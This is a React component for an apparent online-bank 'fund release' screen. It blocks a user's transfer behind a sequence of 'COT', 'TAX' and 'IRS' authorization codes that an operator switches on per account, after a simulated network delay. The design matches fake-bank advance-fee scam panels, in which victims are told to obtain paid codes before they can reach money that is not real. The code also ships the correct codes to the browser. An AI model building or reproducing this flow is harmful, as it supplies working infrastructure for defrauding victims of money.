import React, { useState, useEffect } from 'react';
import { Send, Shield, RefreshCcw, Lock, CheckCircle, AlertCircle, ArrowRight } from 'lucide-react';
import { Queries } from '../supabase/queries';
import { Mutations } from '../supabase/mutations';

interface TransferUIProps {
  onComplete: () => void;
}

type TransferStage = 'INIT' | 'COT' | 'TAX' | 'IRS' | 'PROCESSING' | 'SUCCESS';

const TransferUI: React.FC<TransferUIProps> = ({ onComplete }) => {
  const [stage, setStage] = useState<TransferStage>('INIT');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [restrictions, setRestrictions] = useState<any>(null);
  const [userInputCode, setUserInputCode] = useState('');
  
  const [formData, setFormData] = useState({
    recipient: '',
    amount: '',
    narration: ''
  });

  const [progress, setProgress] = useState(0);

  useEffect(() => {
    const user = JSON.parse(localStorage.getItem('bank_user') || '{}');
    Queries.getTransferRestrictions(user.id).then(({ data }) => setRestrictions(data));
  }, []);

  const handleInitiate = async (e: React.FormEvent) => {
    e.preventDefault();
    const user = JSON.parse(localStorage.getItem('bank_user') || '{}');
    
    if (Number(formData.amount) > Number(user.balance)) {
      setError('Insufficient funds to initiate transfer.');
      return;
    }

    setLoading(true);
    setError(null);

    // Simulated network delay
    setTimeout(() => {
      setLoading(false);
      checkNextStage('INIT');
    }, 1500);
  };

  const checkNextStage = (current: TransferStage) => {
    if (!restrictions) return;

    if (current === 'INIT') {
      if (restrictions.cot_enabled) { setStage('COT'); setProgress(15); }
      else checkNextStage('COT');
    } else if (current === 'COT') {
      if (restrictions.tax_enabled) { setStage('TAX'); setProgress(45); }
      else checkNextStage('TAX');
    } else if (current === 'TAX') {
      if (restrictions.irs_enabled) { setStage('IRS'); setProgress(75); }
      else checkNextStage('IRS');
    } else if (current === 'IRS') {
      finalizeTransfer();
    }
  };

  const verifyCode = () => {
    setError(null);
    let correctCode = '';
    if (stage === 'COT') correctCode = restrictions.cot_code;
    if (stage === 'TAX') correctCode = restrictions.tax_code;
    if (stage === 'IRS') correctCode = restrictions.irs_code;

    if (userInputCode === correctCode) {
      setLoading(true);
      setTimeout(() => {
        setLoading(false);
        setUserInputCode('');
        checkNextStage(stage);
      }, 1000);
    } else {
      setError(`Invalid ${stage} Authorization Code`);
    }
  };

  const finalizeTransfer = async () => {
    setStage('PROCESSING');
    setProgress(90);
    setLoading(true);

    try {
      const user = JSON.parse(localStorage.getItem('bank_user') || '{}');
      await Mutations.recordTransaction(
        user.id, 
        Number(formData.amount), 
        'debit', 
        formData.narration || `Wire Transfer to ${formData.recipient}`
      );
      
      setProgress(100);
      setStage('SUCCESS');
      setTimeout(() => onComplete(), 3000);
    } catch (err: any) {
      setError(err.message);
      setStage('INIT');
    } finally {
      setLoading(false);
    }
  };

  if (stage === 'SUCCESS') {
    return (
      <div className="max-w-2xl mx-auto py-20 text-center space-y-8 animate-in zoom-in-95 duration-700">
        <div className="h-32 w-32 bg-emerald-500/10 rounded-full flex items-center justify-center mx-auto border border-emerald-500/20">
          <CheckCircle size={64} className="text-emerald-500" />
        </div>
        <div>
          <h3 className="text-4xl font-black tracking-tighter uppercase">Transfer Released</h3>
          <p className="text-gray-500 mt-4 font-medium uppercase tracking-widest text-xs">Funds successfully debited from vault core</p>
        </div>
        <div className="bg-[#111] p-6 rounded-3xl border border-white/5 inline-block">
          <p className="text-2xl font-mono font-bold text-emerald-500">-${Number(formData.amount).toLocaleString()}</p>
        </div>
      </div>
    );
  }

  return (
    <div className="max-w-2xl mx-auto py-12 animate-in fade-in slide-in-from-bottom-6 duration-700">
      <div className="bg-[#111] border border-white/5 rounded-[3.5rem] shadow-[0_40px_80px_-15px_rgba(0,0,0,0.5)] overflow-hidden relative">
        <div className="absolute top-0 left-0 w-full h-1.5 bg-white/5">
          <div 
            className="h-full bg-red-600 transition-all duration-1000 ease-out shadow-[0_0_15px_rgba(200,16,46,0.5)]"
            style={{ width: `${progress}%` }}
          />
        </div>

        <div className="bg-red-600/5 border-b border-white/5 p-10 flex items-center justify-between">
          <div className="flex items-center gap-6">
            <div className="bg-red-600 p-4 rounded-[1.5rem] shadow-xl shadow-red-600/20"><Send size={24} /></div>
            <div>
              <h3 className="text-2xl font-bold tracking-tight">External Fund Release</h3>
              <p className="text-[10px] text-gray-500 uppercase tracking-[0.4em] font-black mt-1">Staged Verification Engine v2.0</p>
            </div>
          </div>
          {stage !== 'INIT' && (
            <div className="text-right">
              <p className="text-[10px] font-black text-red-600 uppercase tracking-widest">Stage</p>
              <p className="text-lg font-black tracking-tighter text-white">{stage}</p>
            </div>
          )}
        </div>

        <div className="p-12">
          {stage === 'INIT' ? (
            <form onSubmit={handleInitiate} className="space-y-10">
              <div className="space-y-6">
                <div className="space-y-2">
                  <label className="text-[10px] font-black text-gray-500 uppercase tracking-widest">Recipient Identity</label>
                  <input
                    required className="w-full bg-black/40 border border-white/10 rounded-2xl p-5 outline-none focus:border-red-600 transition-all"
                    placeholder="Legal Entity or Personal Name"
                    value={formData.recipient} onChange={e => setFormData({...formData, recipient: e.target.value})}
                  />
                </div>
                <div className="space-y-2">
                  <label className="text-[10px] font-black text-gray-500 uppercase tracking-widest">Transfer Magnitude ($)</label>
                  <input
                    type="number" required
                    className="w-full bg-black/40 border border-white/10 rounded-2xl p-5 outline-none focus:border-red-600 transition-all text-2xl font-mono"
                    placeholder="0.00"
                    value={formData.amount} onChange={e => setFormData({...formData, amount: e.target.value})}
                  />
                </div>
                <div className="space-y-2">
                  <label className="text-[10px] font-black text-gray-500 uppercase tracking-widest">Audit Narration</label>
                  <input
                    className="w-full bg-black/40 border border-white/10 rounded-2xl p-5 outline-none focus:border-red-600 transition-all"
                    placeholder="Purpose of Funds"
                    value={formData.narration} onChange={e => setFormData({...formData, narration: e.target.value})}
                  />
                </div>
              </div>

              {error && <p className="text-red-500 text-xs font-bold uppercase tracking-widest flex items-center gap-2 animate-pulse"><AlertCircle size={14} /> {error}</p>}

              <button disabled={loading} className="w-full bg-white text-black font-black py-6 rounded-2xl hover:bg-gray-200 transition-all shadow-xl flex items-center justify-center gap-3 uppercase tracking-widest">
                {loading ? <RefreshCcw className="animate-spin" /> : <span>Initiate Release Sequence</span>}
              </button>
            </form>
          ) : (
            <div className="text-center space-y-12 py-6 animate-in zoom-in-95 duration-500">
              <div className="space-y-6">
                <div className="h-24 w-24 rounded-[2rem] bg-amber-500/10 border border-amber-500/20 flex items-center justify-center mx-auto">
                  <Lock size={40} className="text-amber-500 animate-pulse" />
                </div>
                <div>
                  <h3 className="text-3xl font-black uppercase tracking-tighter">Restriction: {stage}</h3>
                  <p className="text-gray-500 text-sm mt-3 uppercase tracking-widest font-medium">Authentication required to advance sequence</p>
                </div>
              </div>

              <div className="max-w-sm mx-auto space-y-6">
                <input
                  type="text" value={userInputCode}
                  onChange={(e) => setUserInputCode(e.target.value.toUpperCase())}
                  className="w-full bg-black border-2 border-amber-500/30 rounded-3xl py-8 px-6 text-center text-4xl font-black text-amber-500 outline-none focus:border-amber-500 transition-all tracking-[0.2em]"
                  placeholder="X-XXXX-X"
                />
                
                {error && <p className="text-red-500 text-xs font-black uppercase tracking-widest">{error}</p>}

                <button 
                  onClick={verifyCode} disabled={loading || !userInputCode} 
                  className="w-full bg-amber-500 hover:bg-amber-600 text-black font-black py-6 rounded-2xl transition-all shadow-2xl shadow-amber-500/20 uppercase tracking-widest"
                >
                  {loading ? <RefreshCcw className="animate-spin" /> : <span>Verify {stage} Authorization</span>}
                </button>
              </div>
              
              <div className="flex justify-center items-center gap-4 text-gray-700">
                <div className={`h-2 w-2 rounded-full ${progress >= 33 ? 'bg-red-600' : 'bg-gray-800'}`} />
                <div className={`h-2 w-2 rounded-full ${progress >= 66 ? 'bg-red-600' : 'bg-gray-800'}`} />
                <div className={`h-2 w-2 rounded-full ${progress >= 90 ? 'bg-red-600' : 'bg-gray-800'}`} />
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default TransferUI;
